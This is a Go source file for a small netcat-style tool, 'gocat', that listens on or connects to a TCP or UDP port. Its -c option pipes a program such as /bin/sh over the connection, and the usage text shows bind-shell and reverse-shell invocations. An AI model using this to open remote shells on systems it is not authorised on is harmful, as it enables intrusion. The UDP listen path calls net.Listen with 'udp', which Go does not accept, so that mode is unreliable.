package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
)

func transferStreams(conn net.Conn, command string) {
	log.Printf("Opened connection: %s\n", conn.RemoteAddr())
	if command != "" {
		if _, err := exec.LookPath(command); err != nil {
			flag.Usage()
			os.Exit(1)
		}
		cmd := exec.Command(command)
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	} else {
		c := make(chan uint64)
		copy := func(r io.ReadCloser, w io.WriteCloser) {
			defer func() {
				r.Close()
				w.Close()
			}()
			n, err := io.Copy(w, r)
			if err != nil {
				log.Printf("[%s]: ERROR: %s\n", conn.RemoteAddr(), err)
			}
			c <- uint64(n)
		}
		go copy(conn, os.Stdout)
		go copy(os.Stdin, conn)
		_ = <-c
		log.Printf("Connection closed by remote peer: %s\n", conn.RemoteAddr())
	}
}

func listenServer(port int, command string, udp bool) {
	var err error
	var s net.Listener
	log.Printf("Listening on port: %d\n", port)
	address := fmt.Sprintf(":%d", port)
	if udp {
		s, err = net.Listen("udp", address)
	} else {
		s, err = net.Listen("tcp", address)
	}
	if err != nil {
		log.Fatalln(err)
	}
	defer s.Close()
	conn, _ := s.Accept()
	defer conn.Close()
	transferStreams(conn, command)
}

func connectClient(host string, port string, command string, udp bool) {
	var err error
	var s net.Conn
	address := fmt.Sprintf("%s:%s", host, port)
	if udp {
		s, err = net.Dial("udp", address)
	} else {
		s, err = net.Dial("tcp", address)
	}
	if err != nil {
		log.Fatalln(err)
	}
	defer s.Close()
	transferStreams(s, command)
}

func main() {
	flag.Usage = func() {
		fmt.Println("gocat v0.1 - written by postrequest")
		fmt.Println("\nOptions:")
		fmt.Println("  -l\tListen Server")
		fmt.Println("  -c\tBinary to execute")
		fmt.Println("  -u\tListen on UDP")
		fmt.Println("\nUsage:")
		fmt.Printf("  %s 10.10.10.10 9000\n", os.Args[0])
		fmt.Printf("  %s -l 9000\n", os.Args[0])
		fmt.Printf("  %s -l 9000 -c /bin/sh\n", os.Args[0])
		fmt.Printf("  %s -c /bin/sh 10.10.10.10 9000 \n", os.Args[0])
	}
	listen := flag.Int("l", 0, "Listen server")
	command := flag.String("c", "", "Binary to execute")
	udp := flag.Bool("u", false, "Listen on UDP")
	flag.Parse()

	if *listen > 0 {
		listenServer(*listen, *command, *udp)
	}
	if len(os.Args) == 5 {
		if os.Args[1] == "-c" {
			if _, err := strconv.Atoi(os.Args[4]); err != nil {
				flag.Usage()
				os.Exit(1)
			}
			connectClient(os.Args[3], os.Args[4], *command, *udp)
		} else if os.Args[3] == "-c" {
			if _, err := strconv.Atoi(os.Args[2]); err != nil {
				flag.Usage()
				os.Exit(1)
			}
			*command = os.Args[4]
			connectClient(os.Args[1], os.Args[2], *command, *udp)
		} else {
			flag.Usage()
			os.Exit(1)
		}
	} else if len(os.Args) == 3 {
		connectClient(os.Args[1], os.Args[2], *command, *udp)
	} else {
		flag.Usage()
		os.Exit(1)
	}
}
